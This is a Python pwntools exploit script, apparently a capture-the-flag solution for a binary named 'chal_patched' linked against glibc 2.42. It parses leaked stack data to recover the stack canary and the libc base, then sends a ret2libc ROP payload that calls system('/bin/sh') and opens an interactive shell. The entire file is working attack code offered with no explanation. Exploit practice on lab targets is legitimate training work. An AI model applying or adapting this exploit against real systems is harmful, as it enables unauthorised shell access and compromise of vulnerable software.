from pwn import *

chal = ELF('./chal_patched')
libc = ELF('../glibc/2.42/libc.so.6')

gdbscript='''
b main
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = process([chal.path])
#conn = gdb.debug([chal.path], gdbscript)

def main():
    stack = conn.recvlines(8)
    canary = int(stack[5][16:], 16)
    addr_libc_base = int(stack[7][16:], 16) - 0x2a575

    addr_pop_rdi_ret = addr_libc_base + 0x0012137c
    addr_ret = addr_libc_base + 0x0010c096
    addr_binsh = addr_libc_base + 0x1dc4c3
    addr_system = addr_libc_base + 0x5c4c0
    
    payload = b'\0' * 0x28
    payload += p64(canary)
    payload += p64(0)
    payload += p64(addr_pop_rdi_ret)
    payload += p64(addr_binsh)
    payload += p64(addr_ret)
    payload += p64(addr_system)

    conn.sendlineafter(b'Input: ', payload)
    conn.interactive()

if __name__ == '__main__':
    main()
